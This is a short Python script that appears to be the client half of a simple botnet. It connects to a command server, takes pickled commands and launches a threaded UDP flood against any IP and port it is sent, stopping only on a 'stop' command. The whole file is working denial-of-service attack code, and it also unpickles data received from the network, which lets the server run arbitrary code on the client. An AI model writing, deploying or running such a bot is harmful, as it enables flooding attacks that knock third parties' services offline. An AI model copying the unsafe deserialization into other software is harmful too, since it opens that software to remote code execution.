import socket
import pickle
import threading

attack = False

# creates and connects a socket
def create():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        try:
            sock.connect(("localhost", 420))
            print("connected to server!")
            return sock
        except:
            print("connection failed!")

def udp_flood(ip, port, message):
    #global attack
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while attack == True:
        sock.sendto(message.encode("utf-8"), (ip, port))

def yes():
    global attack
    sock = create()

    while True:
        try:
            command = sock.recv(1024)
            try:
                command = pickle.loads(command)
                print(command)

                if command[0] == "msg":
                    print(command[1])
                elif command[0] == "udp":
                    attack = True
                    threading.Thread(target=udp_flood, args=(command[1], command[2], command[3])).start()
                elif command[0] == "stop":
                    attack = False
                    print("stoped")
            except:
                pass
        except:
            sock = create()

yes()